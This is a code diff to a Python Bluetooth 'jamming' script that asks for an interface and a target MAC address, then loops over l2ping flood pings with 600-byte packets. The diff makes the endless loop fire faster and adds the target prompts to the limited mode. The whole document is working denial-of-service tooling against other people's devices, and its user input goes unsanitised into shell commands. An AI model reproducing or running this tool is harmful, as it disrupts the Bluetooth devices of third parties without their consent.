@@ -15,18 +15,22 @@ def endless_jamming():
     a = True
     interface = input("Your BT interface : ")
     mac = input("MAC of target: ")
-    while a:
-        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
-        process_1 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        process_2 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        process_3 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        time.sleep(0.1)
-
+    try:
+        while a:
+            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
+            process_1 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            process_2 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            process_3 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            time.sleep(0.01)
+    except Exception as ctrl:
+        print("See ya later")
 
 def limited_jamming():
     global timing
+    interface = input("Your BT interface : ")
+    mac = input("MAC of target: ")
     try:
         while time != 0:
             xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
@@ -48,6 +52,4 @@ def main():
     else:
         print("We will give them chance...")
         limited_jamming()
-
-
 main()
